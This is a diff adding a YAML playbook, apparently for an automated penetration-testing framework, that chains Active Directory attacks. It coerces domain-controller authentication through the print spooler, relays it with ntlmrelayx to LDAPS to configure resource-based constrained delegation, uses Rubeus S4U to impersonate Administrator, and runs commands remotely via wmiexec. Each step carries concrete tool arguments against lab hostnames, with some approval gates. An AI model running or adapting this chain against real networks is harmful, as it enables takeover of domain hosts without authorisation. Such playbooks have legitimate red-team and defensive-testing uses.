@@ -1,0 +1,67 @@
+version: 1
+name: "Generic Resource-Based Constrained Delegation (RBCD) & Coercion Chain"
+description: "End-to-end modern lateral movement: Coerce Machine Auth ➔ Relay to LDAPS (RBCD) ➔ Rubeus S4U Ticket Impersonation ➔ Lateral Takeover"
+
+nodes:
+  - id: "COERCE-01-PRINTER"
+    phase: 1.0
+    title: "MS-RPRN / SpoolSample Authentication Coercion"
+    path: "direct"
+    beachheads: ["linux", "windows"]
+    requires_cred: "lowpriv_user"
+    intent: "coerce.spoolsample"
+    intent_args:
+      target: "dc01.example.lab"
+      listener: "10.10.10.5"
+      domain: "example.lab"
+    produces_cred: "coerced_auth"
+    hitl_gate: null
+    success_marker: "COERCE_01_OK"
+
+  - id: "RELAY-02-RBCD-LDAPS"
+    phase: 2.0
+    title: "Relay Coerced NetNTLM to LDAPS to Configure RBCD msDS-AllowedToActOnBehalfOfOtherIdentity"
+    path: "direct"
+    beachheads: ["linux"]
+    requires_cred: "coerced_auth"
+    intent: "impacket.ntlmrelayx"
+    intent_args:
+      target: "ldaps://dc01.example.lab"
+      delegate_access: true
+      escalate_user: "attacker_pc$"
+    produces_cred: "rbcd_configured"
+    hitl_gate: "acl_write"
+    success_marker: "RELAY_02_RBCD_OK"
+
+  - id: "RBCD-03-RUBEUS-S4U"
+    phase: 3.0
+    title: "Request S4U2Self + S4U2Proxy Service Ticket Impersonating Administrator"
+    path: "direct"
+    beachheads: ["windows"]
+    requires_cred: "rbcd_configured"
+    intent: "rubeus.s4u"
+    intent_args:
+      user: "attacker_pc$"
+      impersonateuser: "Administrator"
+      msdsspn: "cifs/target.example.lab"
+      domain: "example.lab"
+      ptt: true
+    produces_cred: "impersonated_service_ticket"
+    hitl_gate: "ticket"
+    success_marker: "RBCD_03_S4U_OK"
+
+  - id: "EXEC-04-LATERAL-TAKEOVER"
+    phase: 4.0
+    title: "Lateral Command Execution via Impersonated Kerberos Session"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "impersonated_service_ticket"
+    intent: "netexec.smb_exec"
+    intent_args:
+      target: "target.example.lab"
+      command: "whoami /all"
+      domain: "example.lab"
+      exec_method: "wmiexec"
+    produces_cred: "host_admin_session"
+    hitl_gate: null
+    success_marker: "EXEC_04_TAKEOVER_OK"
